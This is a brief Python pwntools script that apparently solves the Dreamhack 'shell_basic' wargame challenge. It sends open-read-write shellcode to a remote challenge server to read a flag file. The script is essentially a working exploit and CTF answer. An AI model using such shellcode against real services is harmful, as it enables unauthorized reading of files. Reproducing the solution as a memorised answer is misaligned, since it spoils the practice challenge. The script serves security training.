from pwn import *
context.arch="amd64"
r = remote("host3.dreamhack.games",21761)

dir = "/home/shell_basic/flag_name_is_loooooong"
shellcode = shellcraft.open(dir)
shellcode += shellcraft.read('rax','rsp',0x30)
shellcode += shellcraft.write(1,'rsp',0x30)
r.sendlineafter("shellcode: ",asm(shellcode))
r.interactive()